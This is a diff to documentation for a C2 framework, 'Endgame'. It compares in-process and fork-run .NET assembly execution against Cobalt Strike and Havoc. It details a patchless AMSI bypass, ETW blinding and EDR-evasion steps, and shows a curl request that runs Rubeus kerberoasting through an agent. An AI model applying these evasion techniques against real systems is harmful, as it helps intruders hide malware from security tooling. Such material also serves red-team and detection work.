@@ -2431,16 +2431,59 @@ curl -sk -H "Authorization: Bearer $TOKEN" \
   -d "{\"assembly\":\"$(base64 -w0 Rubeus.exe)\",\"args\":\"kerberoast\"}" \
   https://127.0.0.1:31337/api/agents/f73ba6cf.../dotnet_exec</pre></div>
 
-<div class="call"><div class="call-lbl">vs dotnet-asm</div>
+<div class="call"><div class="call-lbl">dotnet-asm vs dotnet-exec</div>
 <div class="tw2"><table>
 <thead><tr><th></th><th><code>dotnet-asm</code></th><th><code>dotnet-exec</code></th></tr></thead>
 <tbody>
 <tr><td>Execution context</td><td>Sacrificial process (fork-run)</td><td><strong>Agent process (in-process)</strong></td></tr>
-<tr><td>CLR hosting</td><td>Donut shellcode loader</td><td>Native ICLRRuntimeHost COM API</td></tr>
-<tr><td>Process created</td><td>Yes (e.g. RuntimeBroker.exe)</td><td>No</td></tr>
-<tr><td>EDR visibility</td><td>Creates new process</td><td>Single-process, lower footprint</td></tr>
-<tr><td>Disk touch</td><td>No (shellcode in memory)</td><td>Temp file written, deleted after exec</td></tr>
+<tr><td>CLR hosting</td><td>Donut shellcode → shellcode loader</td><td>Native COM API: <code>ICLRMetaHost → ICLRRuntimeInfo → ICorRuntimeHost → _AppDomain::Load_3(SAFEARRAY)</code></td></tr>
+<tr><td>Process created</td><td>Yes (configurable, e.g. <code>RuntimeBroker.exe</code>)</td><td>No — single process</td></tr>
+<tr><td>EDR process-tree visibility</td><td>New process spawned (detectable)</td><td>No new process — lower footprint</td></tr>
+<tr><td>Agent survives assembly crash</td><td>Yes — only sacrificial proc dies</td><td>Yes — fork fallback kicks in when agent is shellcode-injected (no executable path)</td></tr>
+<tr><td>AMSI bypass</td><td>Via Donut loader inside sacrificial proc</td><td>Patchless VEH: hardware breakpoint on <code>AmsiScanBuffer</code> (DR0), <code>EXCEPTION_SINGLE_STEP</code> → <code>RAX=AMSI_RESULT_CLEAN</code>. Zero bytes written to <code>amsi.dll</code></td></tr>
+<tr><td>ETW blind</td><td>Via Donut loader inside sacrificial proc</td><td><code>NtSetInformationProcess(ProcessEnableReadWriteVmLogging)</code> before CLR init</td></tr>
+<tr><td>Assembly args</td><td>Passed via Donut <code>-p</code> flag at conversion time</td><td>Passed directly as <code>string[] args</code> to <code>Main()</code> — no re-conversion needed</td></tr>
+<tr><td>Disk touch</td><td>No (shellcode injected in memory)</td><td>No — assembly bytes loaded via SAFEARRAY, never written to disk</td></tr>
+<tr><td>When to use</td><td>Assembly calls <code>Environment.Exit()</code> / risky crash potential</td><td>Default — lower OPSEC footprint and stronger evasion</td></tr>
 </tbody></table></div>
+</div>
+
+<div class="call"><div class="call-lbl">vs Cobalt Strike / Havoc</div>
+<p style="margin:0 0 10px 0;color:var(--t2);font-size:.85em">How Endgame&#8217;s <code>dotnet-exec</code> and <code>dotnet-asm</code> compare to the two most widely-used commercial C2 frameworks.</p>
+<div class="tw2"><table>
+<thead><tr><th></th><th>Cobalt Strike<br><code>execute-assembly</code></th><th>Havoc<br><code>dotnet inline-execute</code></th><th>Endgame<br><code>dotnet-exec</code> / <code>dotnet-asm</code></th></tr></thead>
+<tbody>
+<tr><td>Default execution model</td><td>Fork-and-run (always spawns a child via <code>spawnto</code>)</td><td>In-process (no child)</td><td>In-process (<code>dotnet-exec</code>) or fork-run (<code>dotnet-asm</code>) — operator chooses</td></tr>
+<tr><td>CLR hosting technique</td><td>Reflective loader (shellcode) injected into sacrificial proc</td><td>Direct CLR load in beacon process</td><td><code>dotnet-exec</code>: native COM chain (<code>ICLRMetaHost → ICorRuntimeHost → _AppDomain::Load_3</code>) — no CGO, no temp file<br><code>dotnet-asm</code>: Donut + NtCreateSection/NtMapViewOfSection (no VirtualAllocEx/WriteProcessMemory)</td></tr>
+<tr><td>AMSI bypass</td><td>Not built-in — requires external BOF (e.g. <em>InlineExecute-Assembly</em>)</td><td>Built-in patch (overwrites <code>AmsiScanBuffer</code> bytes)</td><td><strong>Patchless VEH</strong>: hardware breakpoint DR0 on <code>AmsiScanBuffer</code>; VEH handler intercepts <code>EXCEPTION_SINGLE_STEP</code> and returns <code>AMSI_RESULT_CLEAN</code> — zero bytes written, invisible to memory-integrity scans</td></tr>
+<tr><td>ETW disable</td><td>Not built-in</td><td>Built-in (byte patch)</td><td><code>NtSetInformationProcess</code> before CLR init — process-wide, no byte patch in ETW DLL</td></tr>
+<tr><td>Agent survives crash</td><td>Yes — only sacrificial proc dies</td><td>No — <code>Environment.Exit()</code> or crash kills the beacon</td><td>Yes (<code>dotnet-asm</code>); <code>dotnet-exec</code> also survives via automatic fork fallback when running as shellcode</td></tr>
+<tr><td>Known EDR IoCs</td><td><code>spawnto</code> binary (e.g. <code>rundll32.exe</code>) spawning a child, then injecting shellcode into it</td><td>CLR loaded inside beacon process; AMSI byte-patch in beacon memory visible to scanners</td><td>VEH handler registered in agent process — no RWX regions, no byte patches; <code>dotnet-asm</code> uses <code>NtCreateSection</code>+<code>NtMapViewOfSection</code> (avoids <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code> heuristics)</td></tr>
+<tr><td>Multiple languages</td><td>Beacon only (C/asm)</td><td>Havoc daemon (C)</td><td>Go · C · Nim · Rust — all four agents implement identical CLR hosting independently</td></tr>
+</tbody></table></div>
+</div>
+
+<div class="call"><div class="call-lbl">dotnet-exec — internal COM chain</div>
+<p style="margin:0 0 8px 0;color:var(--t2);font-size:.85em">Full execution path from operator command to assembly output. No CGO. No temp file. Implemented identically in Go, C, Nim, and Rust.</p>
+<ol style="margin:0;padding-left:1.4em;line-height:2">
+  <li><strong>Pre-load <code>amsi.dll</code></strong> via <code>LoadLibraryA</code> before CLR init — the CLR loads AMSI lazily during <code>Load_3</code>; forcing it early lets the bypass hook it before any scan runs.</li>
+  <li><strong>Patchless AMSI bypass (VEH)</strong>: set hardware breakpoint DR0 on <code>AmsiScanBuffer</code>; register <code>AddVectoredExceptionHandler</code> callback. On <code>EXCEPTION_SINGLE_STEP</code>, set <code>RAX = 1</code> (<code>AMSI_RESULT_CLEAN</code>) and clear DR7. Zero bytes modified in <code>amsi.dll</code>.</li>
+  <li><strong>ETW blind</strong>: <code>NtSetInformationProcess(hProcess, ProcessEnableReadWriteVmLogging, 0)</code> — disables ETW event emission for this process before the CLR registers its providers.</li>
+  <li><strong>COM chain</strong>:
+    <ul style="margin:.3em 0 0 1em;line-height:1.9">
+      <li><code>CLRCreateInstance(CLSID_CLRMetaHost) → ICLRMetaHost</code></li>
+      <li><code>ICLRMetaHost::GetRuntime("v4.0.30319") → ICLRRuntimeInfo</code></li>
+      <li><code>ICLRRuntimeInfo::GetInterface(CLSID_CorRuntimeHost) → ICorRuntimeHost</code></li>
+      <li><code>ICorRuntimeHost::Start()</code> — called <em>before</em> AMSI patching to avoid the CLR startup access-violation race</li>
+      <li><code>ICorRuntimeHost::GetDefaultDomain() → _AppDomain</code></li>
+      <li><code>_AppDomain::Load_3(SAFEARRAY bytes) → _Assembly</code> — assembly bytes loaded entirely in memory via <code>oleaut32!SafeArrayCreate</code></li>
+      <li><code>_Assembly::get_EntryPoint() → _MethodInfo</code></li>
+      <li><code>_MethodInfo::Invoke_3(null, args SAFEARRAY) → output</code></li>
+    </ul>
+  </li>
+  <li><strong>Console capture</strong>: before <code>Invoke_3</code>, stdout/stderr are redirected to an anonymous pipe. The parent thread drains the pipe and returns the captured text as the task result.</li>
+  <li><strong>Fork fallback</strong>: if <code>os.Executable()</code> fails (agent running as reflective shellcode with no on-disk EXE path), the agent automatically spawns a copy of itself as a suspended child, sends the assembly bytes over a pipe, and collects output — the parent agent is never at risk if the child crashes.</li>
+</ol>
 </div>
 
 <h4>Token</h4>
